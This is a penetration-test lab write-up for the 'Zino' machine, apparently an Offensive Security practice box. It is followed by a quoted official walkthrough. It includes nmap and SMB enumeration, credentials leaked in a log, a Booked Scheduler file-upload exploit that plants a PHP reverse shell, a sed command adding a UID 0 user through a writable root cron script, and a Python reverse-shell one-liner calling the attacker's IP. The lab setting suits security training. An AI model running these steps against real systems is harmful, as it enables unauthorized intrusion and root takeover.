# Zino
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| EDB-ID-46486 | Browsed to http://$TARGET:8003/booked/Web/admin/manage_theme.php? and uploaded a Reverse Shell using the favicon.ico field. |
| A cron job that runs as root and executes a Python script writable by 'www-data'. | Used sed to insert an malicious os.system call in the Python script, resulting in the creation a new user with an UID and GID of 0. |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: zino
* Description: Good introduction to basic fundamentals.
* IP Address: 192.168.51.64
* MAC Address: 00:50:56:bf:47:c7 (ref: ifconfig via post-exploitation) 
* Domain: ZINO
* Distro: Debian (ref: uname via post-exploitation)
* Kernel: Linux 4.19.0-8-amd64 (ref: uname via post-exploitation)
* Architecture: x86 (ref: uname via post-exploitation)

### Ports
```bash
# Nmap 7.91 scan initiated Sun Jul 11 16:23:18 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/zino-nmap-complete 192.168.51.64
Nmap scan report for 192.168.51.64
Host is up (0.084s latency).
Not shown: 65535 open|filtered ports, 65529 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport

# Nmap done at Sun Jul 11 16:27:37 2021 -- 1 IP address (1 host up) scanned in 258.72 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sun Jul 11 16:39:13 2021 as: nmap -sV -sC -pT:21,22,139,445,3306,8003 -oN scans/zino-nmap-versions 192.168.51.64
Nmap scan report for 192.168.51.64
Host is up (0.077s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
|_  256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, afp, ms-sql-s: 
|_    Host '192.168.49.51' is not allowed to connect to this MariaDB server
8003/tcp open  http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/11%Time=60EB56F4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.51'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ms-sql-s,4
SF:C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.51'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(afp,4C,"H\0\0\
SF:x01\xffj\x04Host\x20'192\.168\.49\.51'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2021-07-11T16:39:31-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-11T20:39:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 16:40:09 2021 -- 1 IP address (1 host up) scanned in 55.80 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sun Jul 11 17:02:05 2021 as: nmap -O -oN scans/zino-nmap-os 192.168.51.64
Nmap scan report for 192.168.51.64
Host is up (0.073s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 11 17:02:17 2021 -- 1 IP address (1 host up) scanned in 12.38 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
Connected to 192.168.51.64.
220 (vsFTPd 3.0.3)
Name (192.168.51.64:victor): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.51.64

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP  
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET

# output
[+] IP: 192.168.51.64:445       Name: 192.168.51.64                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        zino                                                    READ ONLY       Logs
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

Victor was able to download files from the accessible SMB share.
```bash
cd loot
smbclient \\\\$TARGET\\$SHARE
prompt
mget *

# output
NT_STATUS_ACCESS_DENIED opening remote file \.bash_history
getting file \error.log of size 265 as error.log (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \.bash_logout of size 220 as .bash_logout (0.7 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \local.txt of size 33 as local.txt (0.1 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \.bashrc of size 3526 as .bashrc (11.9 KiloBytes/sec) (average 3.4 KiloBytes/sec)
getting file \.profile of size 807 as .profile (2.8 KiloBytes/sec) (average 3.3 KiloBytes/sec)
getting file \misc.log of size 424 as misc.log (1.4 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \auth.log of size 368 as auth.log (1.2 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \access.log of size 5464 as access.log (18.0 KiloBytes/sec) (average 4.6 KiloBytes/sec)
```

```bash
cat *.log
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

```bash
firefox http://192.168.51.64:8003/booked/ # admin:adminadmin
firefox http://192.168.51.64:8003/booked/Web/admin/manage_theme.php?
```

```bash
cp /usr/share/webshells/php/php-reverse-shell ./rshell.php
vim rshell.php
firefox http://192.168.51.64:8003/booked/Web/
```

```bash
sudo nc -nvlp 8003
curl http://192.168.51.64:8003/booked/Web/custom-favicon.php
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

```bash
cat /etc/crontab

# output
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
#
```

```bash
ls -al /var/www/html/booked/

# output
total 432
drwxrwxrwx 17 www-data www-data   4096 Jul 11 18:08 .
drwxr-xr-x  3 root     root       4096 Apr 28  2020 ..
-rw-rw-rw-  1 www-data www-data 260290 Feb  5  2019 cacert.pem
-rwxrwxrwx  1 victor   root        315 Jul 11 18:08 cleanup.py
drwxrwxrwx  2 www-data www-data   4096 Apr 28  2020 config
drwxrwxrwx  3 www-data www-data   4096 Feb  5  2019 Controls
drwxrwxrwx  3 www-data www-data   4096 Feb  5  2019 database_schema
-rw-rw-rw-  1 www-data www-data   4187 Feb  5  2019 development-guide.txt
drwxrwxrwx  5 www-data www-data   4096 Feb  5  2019 Domain
-rw-rw-rw-  1 www-data www-data   3509 Feb  5  2019 favicon.png
-rw-rw-rw-  1 www-data www-data    476 Feb  5  2019 .htaccess
-rw-rw-rw-  1 www-data www-data   1175 Feb  5  2019 index.php
drwxrwxrwx  2 www-data www-data   4096 Feb  5  2019 Jobs
drwxrwxrwx 28 www-data www-data   4096 Feb  5  2019 lang
drwxrwxrwx 13 www-data www-data   4096 Feb  5  2019 lib
-rw-rw-rw-  1 www-data www-data  35821 Feb  5  2019 License
drwxrwxrwx 12 www-data www-data   4096 Feb  5  2019 Pages
drwxrwxrwx  8 www-data www-data   4096 Feb  5  2019 plugins
drwxrwxrwx 12 www-data www-data   4096 Feb  5  2019 Presenters
-rw-rw-rw-  1 www-data www-data  31287 Feb  5  2019 readme.html
-rw-rw-rw-  1 www-data www-data  15536 Feb  5  2019 readme_installation.html
drwxrwxrwx 21 www-data www-data   4096 Feb  5  2019 tpl
drwxrwxrwx  2 www-data www-data   4096 Jul 11 17:32 tpl_c
drwxrwxrwx  3 www-data www-data   4096 Feb  5  2019 uploads
drwxrwxrwx 14 www-data www-data   4096 Jul 11 17:47 Web
drwxrwxrwx  6 www-data www-data   4096 Feb  5  2019 WebServices
```

```bash
cat /var/www/html/booked/cleanup.py

# output
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
except:
        print 'ERROR...'
sys.exit(0)
```

```bash
sed -i "/os.system/a\        os.system('useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor')" cleanup.py
tail -n1 /etc/passwd
su victor # victor:password
id

# output
uid=0(root) gid=0(root) groups=0(root)
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* smbclient
* smbmap
* searchsploit
* php-reverse-shell.php
* nc
* sed

## Hints
* Scan all TCP ports and find the web app. Then, bruteforce the app's directories.
* Check the version of the application. There is a file upload vulnerability here, but you might need to do a few tweaks.
* Check what processes run on a schedule.

## Flags
* local.txt = 5a5b9d0a6b837e450ae09c1085913a08
* proof.txt = 22533c43f573c8f268484b84ebe1f440

## Official Walkthrough
```bash
Exploitation Guide for Zino
Summary
We will exploit this machine through the Booked Scheduler web application using a password found in an open samba share. After logging in, we’ll upload a PHP reverse shell to gain the initial foothold on the machine. Next, we’ll escalate via the a scheduled script, which we will edit to run a reverse shell, granting us root access.

Enumeration
Nmap
We’ll start with an nmap scan against all TCP ports.

kali@kali:~$ sudo nmap -p- 192.168.130.64
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 17:50 UTC
Nmap scan report for 192.168.130.64
Host is up (0.031s latency).
Not shown: 65529 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport

Nmap done: 1 IP address (1 host up) scanned in 116.92 seconds
kali@kali:~$

Enumerating port 8003, we discover the /booked/ directory.

kali@kali:~$ sudo nmap -p 8003 192.168.130.64 -A -sV -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 17:57 UTC
Nmap scan report for 192.168.130.64
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
8003/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 2.6.X (86%)
OS CPE: cpe:/o:linux:linux_kernel:2.6
Aggressive OS guesses: Linux 2.6.18 - 2.6.22 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.1.1

TRACEROUTE (using port 8003/tcp)
HOP RTT      ADDRESS
1   37.37 ms 192.168.49.1
2   39.02 ms 192.168.130.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds
kali@kali:~$

Samba Enumeration
Next, we’ll enumerate the open Samba share, using a blank password…

kali@kali:~$ smbclient -L \\\\192.168.130.64
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
kali@kali:~$ 

…and explore the zino directory.

kali@kali:~$ smbclient '//192.168.130.64/zino'
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 19:11:49 2020
  ..                                  D        0  Tue Apr 28 13:38:53 2020
  .bash_history                       H        0  Tue Apr 28 15:35:28 2020
  error.log                           N      265  Tue Apr 28 14:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 13:38:53 2020
  local.txt                           N       33  Mon Dec 21 17:47:08 2020
  .bashrc                             H     3526  Tue Apr 28 13:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 14:17:02 2020
  .profile                            H      807  Tue Apr 28 13:38:53 2020
  misc.log                            N      424  Tue Apr 28 14:08:15 2020
  auth.log                            N      368  Tue Apr 28 14:07:54 2020
  access.log                          N     5464  Tue Apr 28 14:07:09 2020
  ftp                                 D        0  Tue Apr 28 14:12:56 2020

                7158264 blocks of size 1024. 4726784 blocks available
smb: \>

After downloading the log files for further analysis, we turn our attention to the misc.log file.

smb: \> get misc.log
getting file \misc.log of size 424 as misc.log (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \> exit
kali@kali:~$ cat misc.log
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
kali@kali:~$

We’ll make a note of the plaintext admin:adminadmin credentials.

Exploitation
Booked Scheduler File Upload Vulnerability
Navigating to http://192.168.130.64:8003/booked/, we are redirected to http://192.168.130.64:8003/booked/Web/?. The footer indicates that this app is Booked Scheduler v2.7.5.



This version of the software has a file upload vulnerability (https://www.exploit-db.com/exploits/46486), which requires user credentials for the application. Since the admin:adminadmin credentials work against http://192.168.130.64:8003/booked/Web/index.php, we can use them for this exploit.

Since this Metasploit module is inconsistent, we will replicate the exploit manually. First, we’ll navigate to http://192.168.130.64:8003/booked/Web/admin/manage_theme.php and download a PHP reverse shell from http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz.

We’ll update the IP address to match our Kali machine, and select port 8003. Next, we’ll upload the shell under the Favicon upload control. Even though the user interface does not indicate it, the file will be successfully uploaded after clicking Update.



As the exploit suggests, our reverse shell file was saved as /var/www/html/booked/Web/custom-favicon.php. Let’s start a netcat listener on port 8003 and navigate to our reverse shell at http://192.168.130.64:8003/booked/Web/custom-favicon.php to obtain remote code execution as the www-data user.

kali@kali:~$ nc -lvp 8003
listening on [any] 8003 ...
192.168.130.64: inverse host lookup failed: Unknown host
connect to [192.168.49.130] from (UNKNOWN) [192.168.130.64] 44046
Linux zino 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 13:16:30 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@zino:/$

Escalation
Crontab
Now that we have our foothold, let’s investigate crontab jobs.

www-data@zino:/$ cat /etc/crontab 
cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
#
www-data@zino:/$

The last job (python /var/www/html/booked/cleanup.py) is worth investigating, especially since it runs with root privileges. It is owned by the www-data user.

www-data@zino:/$ ls -la /var/www/html/booked/cleanup.py
ls -la /var/www/html/booked/cleanup.py
-rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
www-data@zino:/$

This means that we can write to the file and the contents of the file will be executed as root. We can abuse this misconfiguration by replacing the contents of the python script with a reverse shell.

www-data@zino:/$ echo "" > /var/www/html/booked/cleanup.py
echo """" > /var/www/html/booked/cleanup.py
www-data@zino:/$  cat <<EOT>> /var/www/html/booked/cleanup.py
 cat <<EOT>> /var/www/html/booked/cleanup.py
> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.130",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
<s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
> EOT
EOT
www-data@zino:/$

Let’s set up a netcat listener on port 445 and wait for the cron job to run.

kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
192.168.130.64: inverse host lookup failed: Unknown host
connect to [192.168.49.130] from (UNKNOWN) [192.168.130.64] 50572
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
Eventually, we receive a connection and confirm that we have a root shell!
```
